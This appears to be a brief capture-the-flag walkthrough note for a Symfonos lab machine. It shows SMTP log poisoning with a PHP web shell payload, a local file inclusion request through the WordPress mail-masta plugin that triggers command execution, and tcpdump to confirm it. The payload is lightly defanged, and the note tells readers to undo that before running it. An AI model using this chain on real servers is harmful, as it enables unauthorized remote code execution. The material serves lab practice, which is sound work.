> [!NOTE]
> Windows Defender Antivirus (AV) triggers on `.md` (Markdown) files, often flagging them as potential threats. As a result, the commands provided below have been defanged to avoid false positives. Kindly remove the `p_h_p` and `c_m_d` before executing them.

Upload a php cmd paramater through SMTP, and if we can access it through LFI we'll get command injection

> [!NOTE]
> ```
> MAIL FROM: test
> RCPT TO: helios
> DATA
> <?p_h_p system($_REQUEST['c_m_d']); ?>
> .
> ```

![unnamed_e371da6433014877b1a384f103451433](unnamed_e371da6433014877b1a384f103451433.png)

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.p_h_p?pl=/var/mail/helios&cmd=ping -c4 192.168.1.42
```

```
tcpdump -i tun0 icmp
```
![[Pasted image 20251103012020.png]]